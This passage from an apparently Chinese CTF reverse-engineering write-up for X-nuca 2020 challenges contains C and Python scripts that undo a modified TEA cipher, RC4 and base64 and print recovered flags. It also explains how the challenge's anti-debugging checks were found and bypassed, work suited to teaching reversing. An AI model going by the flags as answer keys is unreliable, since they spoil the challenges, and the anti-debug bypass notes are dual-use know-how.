class="number">0x12</span>, <span class="number">0x53</span>, <span class="number">0xB2</span>, <span class="number">0xC9</span>, <span class="number">0x93</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x7F</span>, <span class="number">0xDC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#x "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars+i));</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*unsigned int v32 = 0xb061f013;</span></span><br><span class="line"><span class="comment">unsigned int v28 = 0xb3c8567e;</span></span><br><span class="line"><span class="comment">unsigned int v25 = 0x9952a3c7;</span></span><br><span class="line"><span class="comment">unsigned int v29 = 0x451c2d3f;</span></span><br><span class="line"><span class="comment">unsigned int v26 = 0x3ee32267;</span></span><br><span class="line"><span class="comment">unsigned int v27 =  0xe3e22b3e;</span></span><br><span class="line"><span class="comment">unsigned int v10 = 0x43e5a250;</span></span><br><span class="line"><span class="comment">unsigned int v30 = 0x59b28ed0;</span></span><br><span class="line"><span class="comment">unsigned int v31 = 0xf8649dc;</span></span><br><span class="line"><span class="comment">unsigned int v11 = 0x9bf4d083;</span></span><br><span class="line"><span class="comment">unsigned int v12 = 0x8a578110;</span></span><br><span class="line"><span class="comment">unsigned int v13 = 0x8604ec4f;</span></span><br><span class="line"><span class="comment">unsigned int v14 = 0x2eb5a27f;</span></span><br><span class="line"><span class="comment">unsigned int v15 = 0x1217ddf3;</span></span><br><span class="line"><span class="comment">unsigned int v16 = 0x93c9b253;</span></span><br><span class="line"><span class="comment">unsigned int v33 = 0xdc7f8e43;*/</span></span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v32 = <span class="number">0xb061f013</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v28 = <span class="number">0xb3c8567e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v25 = <span class="number">0x9952a3c7</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29 = <span class="number">0x451c2d3f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26 = <span class="number">0x3ee32267</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v27 = <span class="number">0xe3e22b3e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v10 = <span class="number">0x43e5a250</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v30 = <span class="number">0x59b28ed0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v31 = <span class="number">0xf8649dc</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v11 = <span class="number">0x9bf4d083</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12 = <span class="number">0x8a578110</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v13 = <span class="number">0x8604ec4f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v14 = <span class="number">0x2eb5a27f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v15 = <span class="number">0x1217ddf3</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v16 = <span class="number">0x93c9b253</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v33 = <span class="number">0xdc7f8e43</span>;</span><br><span class="line"><span class="comment">//unsigned int v33 = 0;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v17 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v40 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v18 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans1[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v19;</span><br><span class="line"><span class="keyword">int</span> v34 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">ans[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">ans[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">ans[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ans1[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">ans1[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">ans1[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">ans1[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v17 = <span class="number">0x8FF34781</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">*(_int8 *)&amp;v18 = v17 &gt;&gt; <span class="number">2</span>; <span class="comment">//LOBYTE</span></span><br><span class="line"> v19 = (((v32 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v16) + (<span class="number">4</span> * v32 ^ (v16 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                       + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xF</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                       - <span class="number">5</span>) ^ v16)</span><br><span class="line">                                                                    + (v32 ^ v17));</span><br><span class="line">v33 = v33-v19;</span><br><span class="line"> v16 -= (((v33 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v15) + (<span class="number">4</span> * v33 ^ (v15 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xE</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v15)</span><br><span class="line">                                                                     + (v33 ^ v17));</span><br><span class="line">                                                                     </span><br><span class="line">v15 -= (((v16 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v14) + (<span class="number">4</span> * v16 ^ (v14 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xD</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v14)</span><br><span class="line">                                                                     + (v16 ^ v17));</span><br><span class="line">v14 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v13) + (v15 ^ v17)) ^ (((v15 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v13)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v15 ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v13 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xB</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v12) + (v14 ^ v17)) ^ (((v14 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v12) + (<span class="number">4</span> * v14 ^ (v12 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v12 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xA</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v11) + (v13 ^ v17)) ^ (((v13 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v11) + (<span class="number">4</span> * v13 ^ (v11 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v11 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">9</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v31) + (v12 ^ v17)) ^ (((v12 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v31) + (<span class="number">4</span> * v12 ^ (v31 &gt;&gt; <span class="number">5</span>)));<span class="comment">////</span></span><br><span class="line">v31 -= (((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v30)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v11 ^ (v30 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line"><span class="comment">//v18 = v31 + (((*((_int32 *)ans1 + 5 + ((v17 &gt;&gt; 2) &amp; 3) - 5) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; 3) ^ 16 * v30) + (4 * v11 ^ (v30 &gt;&gt; 5))));</span></span><br><span class="line">v30 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v10) + (v31 ^ v17)) ^ (((v31 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v10) + (<span class="number">4</span> * v31 ^ (v10 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v10 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v27) + (v30 ^ v17)) ^ (((v30 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v27) + (<span class="number">4</span> * v30 ^ (v27 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v27 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v26) + (v10 ^ v17)) ^ (((v10 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v26) + (<span class="number">4</span> * v10 ^ (v26 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v26 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v29) + (v27 ^ v17)) ^ (((v27 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v29) + (<span class="number">4</span> * v27 ^ (v29 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v29 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">3</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v25) + (v26 ^ v17)) ^ (((v26 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v25) + (<span class="number">4</span> * v26 ^ (v25 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v25 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v28) + (v29 ^ v17)) ^ (((v29 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v28) + (<span class="number">4</span> * v29 ^ (v28 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v28 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v32) + (v25 ^ v17)) ^ (((v25 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v32) + (<span class="number">4</span> * v25 ^ (v32 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v32 -= (((v28 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v33) + (<span class="number">4</span> * v28 ^ (v33 &gt;&gt; <span class="number">5</span>))) ^ ((v33 ^ *(_int32 *)(ans + <span class="number">20</span> + (v17 &amp; <span class="number">0xC</span>) - <span class="number">20</span>)) + (v28 ^ v17));</span><br><span class="line">v17 += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(v17 != <span class="number">0</span>);</span><br><span class="line">v34++;</span><br><span class="line">&#125;<span class="keyword">while</span>(v34 != <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"good!"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接通过调试窗口取出的解密数据，然后打印出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">0x67616c66</span>, <span class="number">0x6330447b</span>, <span class="number">0x37306261</span>,<span class="number">0x35346146</span>, <span class="number">0x36623241</span>,</span><br><span class="line"><span class="number">0x62376646</span>, <span class="number">0x41364541</span>, <span class="number">0x41624261</span>, <span class="number">0x64354635</span>,</span><br><span class="line"><span class="number">0x43336263</span>, <span class="number">0x43446639</span>, <span class="number">0x66613545</span>, <span class="number">0x34354665</span>,</span><br><span class="line"><span class="number">0x38434144</span>, <span class="number">0x30354138</span>, <span class="number">0x7d413339</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, *(((<span class="keyword">char</span> *)&amp;a[i])+j));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;D0cab07Fa45A2b6Ff7bAE6AaBbA5F5dcb3C9fDCE5afeF54DAC88A5093A&#125;</span></span><br></pre></td></tr></table></figure><p>其中是sub_11E40这个函数对程序流程进行了一些骚操作，好像是hook。</p><p>ps：后面看别人的wp学习我才知道自己逆向的这个算法是一个魔改的tea，然后那个骚操作是hook了程序的memcmp函数。</p><h1 id="UnravelMFC"><a href="#UnravelMFC" class="headerlink" title="UnravelMFC"></a>UnravelMFC</h1><p><strong>ps：ida动调打patch后的程序会闪退吗。。</strong></p><p>这个题对于我我现在的知识储备感觉考的东西还是挺多的。</p><p>首先算法：RC4，base64的简单改动，改了delta的tea。</p><p>然后说说程序的一些坑，开始使用如下的函数执行一个函数指针数组的所有函数，里面包括了smc，变换数据，和反调试检测(简单的<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>）：</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212112326826.png" alt="image-20201212112326826"></p><p>另外就是一个反调试我找了好久，一度怀疑是ida版本的bug，每次调试到一个地方就闪退，一直跟最后跟到库里的一个创建窗口函数，然后就退出了，但为什么呢。。后面才发现是在一个函数初始化窗口时的函数用了<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>检测调试，如果处于调试状态就不会初始化这个窗口了，然后调用ExitProcess退出程序。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155507714.png" alt="image-20201213155507714"></p><p>从这个函数向上找调用：可以看到消息值0x110，一些<strong>RegisterWindowsMessageW</strong>函数后出现对话框过程处理函数（DialogFunc）。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213160502370.png" alt="image-20201213160502370"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155933860.png" alt="image-20201213155933860"></p><p>此时我又想到正在做的另外一个MFC程序，那找主要的对话框初始化函数是不是也可以找呢，试了一下：确实可行。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213161554990.png" alt="image-20201213161554990"></p><p>接着上面那个用函数指针调用的函数：一个简单的反调试，虽然简单，但感觉不好发现。。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114250004.png" alt="image-20201212114250004"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114424506.png" alt="image-20201212114424506"></p><p>上面说到那个反调试不好发现，但其实有一个查程序退出原因的办法，那就是不断跟踪：下面是退出前我跟到的一个API：</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163744884.png" alt="image-20201213163744884"></p><p><a href="https://www.gladir.com/CODER/CWINDOWS/createdialogindirectparamw.htm" target="_blank" rel="noopener">函数解释</a>，其实这个函数就类似DialogBoxParamA()函数，用对话框的模板创建模态对话框。而窗口过程函数指针在第四个参数。。这也是我们关心的关键函数，下个断点。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163854906.png" alt="image-20201213163854906"></p><p>然后就是为什么程序要输入字符长度为66才会enable确定按钮，但为什么只能输入63个字符呢，，这也是我在做题时一直想的问题，然后当时也就不想逆下去了。</p><p>而当我在输入框输入正确的flag时这个输入长度又可以是66，难道还有检查机制。。找了半天没有找到，后面发现是那个文本框是根据我输入的字符宽度来决定能输入多少内容。。。因为比赛时我输入的全是1，而字符1比较宽，这里输入全是i的话能容纳的就多了。这应该是设置了输入框的一个属性吧。</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212115832156.png" alt="image-20201212115832156"></p><p>剩下对于程序的就是mfc消息对应的处理函数的学习。然后逆向2部分解密。</p><p>这里只说一下我在python逆tea加密时遇到的坑，因为python不像C语言，int型数据的话就固定是4个字节，python就是作为一个大数处理，所以每次的数据我们都要<strong>&amp;0xffffffff</strong>取低4字节数据。</p><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">v13, v16, v17 = BitVecs(<span class="string">'v13 v16 v17'</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v14 = <span class="number">0x2F9970FF</span></span><br><span class="line">v15 = <span class="number">0xDF3634AE</span></span><br><span class="line">s.add(v16 - v13 == <span class="number">0x3F66B755B4490579</span>)</span><br><span class="line">s.add(v13 + v17 == <span class="number">0x162F924623D2CAE0</span>)</span><br><span class="line">s.add(v17 - v16 == <span class="number">0x7C3C71F1B295D77F</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v13, v16, v17:</span><br><span class="line">print(hex(s.model()[i].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">'usat'</span>)</span><br><span class="line"></span><br><span class="line">enc2 = [<span class="number">0x2d46347f</span>, <span class="number">0x5e79f6f4</span>, <span class="number">0xDF3634AE</span>, <span class="number">0x2F9970FF</span>, <span class="number">0x6cacebd5</span>, <span class="number">0x12c2fc6d</span>, <span class="number">0xe8e95dc6</span>, <span class="number">0xc558d3ec</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">def delta():</span></span><br><span class="line"><span class="string">a = 0</span></span><br><span class="line"><span class="string">for i in range(32):</span></span><br><span class="line"><span class="string">a += 0x2433B95A</span></span><br><span class="line"><span class="string">a &amp;= 0xffffffff</span></span><br><span class="line"><span class="string">return a</span></span><br><span class="line"><span class="string">print(hex(delta()))</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x0D9610D02</span>, <span class="number">0x2AADA57D</span>, <span class="number">0x0A37537F1</span>, <span class="number">0x0C29E3913</span>, <span class="number">0x0D5942CE8</span>, <span class="number">0x608CCE66</span>, <span class="number">0x6D593422</span>, <span class="number">0x21E5D6F2</span>, <span class="number">0x0ED3A9235</span>, <span class="number">0x9DAD62C4</span>, <span class="number">0x3856641B</span>, <span class="number">0x71F75B9D</span>, <span class="number">0x0DCDEDAE8</span>, <span class="number">0x0EAD2D1A0</span>, <span class="number">0x0BAC4F564</span>, <span class="number">0x0DA4772AC</span>]</span><br><span class="line">enc1 = [<span class="number">36</span>,  <span class="number">72</span>,  <span class="number">77</span>,  <span class="number">37</span>,  <span class="number">47</span>,  <span class="number">78</span>,  <span class="number">69</span>,  <span class="number">88</span>,  <span class="number">44</span>,  <span class="number">55</span>, </span><br><span class="line">   <span class="number">57</span>,  <span class="number">80</span>,  <span class="number">66</span>,  <span class="number">78</span>,  <span class="number">92</span>,  <span class="number">67</span>,  <span class="number">47</span>,  <span class="number">66</span>,  <span class="number">81</span>,  <span class="number">76</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">83</span>,  <span class="number">87</span>,  <span class="number">44</span>,  <span class="number">42</span>,  <span class="number">47</span>,  <span class="number">39</span>,  <span class="number">56</span>,  <span class="number">84</span>,  <span class="number">35</span>, </span><br><span class="line">   <span class="number">85</span>,  <span class="number">77</span>,  <span class="number">67</span>,  <span class="number">52</span>,  <span class="number">37</span>,  <span class="number">69</span>,  <span class="number">71</span>,  <span class="number">64</span>,  <span class="number">64</span>,  <span class="number">64</span>, </span><br><span class="line">   <span class="number">44</span>,  <span class="number">46</span>,  <span class="number">37</span>,  <span class="number">53</span>]</span><br><span class="line">in_put = <span class="string">'asfa2asf1asfsa13asfsfasasfas313ssljlslgjlasjlsagljlagaaslagsafsasa'</span></span><br><span class="line">a = [<span class="number">0x21</span>, <span class="number">0x5B</span>, <span class="number">0xD0</span>, <span class="number">0x3D</span>, <span class="number">0xE1</span>, <span class="number">0xE5</span>, <span class="number">0x2F</span>, <span class="number">0x7C</span>, <span class="number">0xD1</span>, <span class="number">0x79</span>, </span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x59</span>, <span class="number">0x2E</span>, <span class="number">0xAF</span>, <span class="number">0xC7</span>, <span class="number">0x88</span>, <span class="number">0x5C</span>, <span class="number">0x35</span>, <span class="number">0x25</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x2F</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0x2E</span>, <span class="number">0x9C</span>, <span class="number">0xD6</span>, <span class="number">0x8A</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>]</span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">xor += [ord(in_put[i])^a[i]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------1--------------------</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc1)):</span><br><span class="line">enc1[i] -= <span class="number">35</span></span><br><span class="line">flag1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc1:</span><br><span class="line">flag1 += base[i]</span><br><span class="line">flag1 = base64.b64decode(flag1.encode())</span><br><span class="line">flag1 = list(flag1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag1)):</span><br><span class="line">flag1[i] ^= xor[i]</span><br><span class="line">flag1 = <span class="string">''</span>.join(map(chr, flag1))</span><br><span class="line">print(flag1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------2--------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span 